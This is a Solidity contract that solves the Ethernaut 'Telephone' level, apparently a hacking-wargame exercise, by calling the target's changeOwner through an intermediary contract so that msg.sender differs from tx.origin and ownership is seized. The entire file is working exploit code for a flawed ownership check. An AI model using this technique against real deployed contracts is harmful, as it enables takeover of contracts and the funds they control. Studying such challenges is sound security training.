// # Ethernaut 4: Telephone

pragma solidity ^0.6.0;

import "./04_Telephone.sol";

contract TelephoneAttack {
    Telephone telephone;

    constructor (address telephoneAddr) public {
        telephone = Telephone(telephoneAddr);
    }

    // All it takes to set `owner` on the `Telephone` instance is that `msg.sender`
    // is not equal to `tx.origin`. This is achieved by calling `changeOwner` through
    // another contract rather than directly.
    function doChangeOwner () public {
        telephone.changeOwner(msg.sender);
    }
}
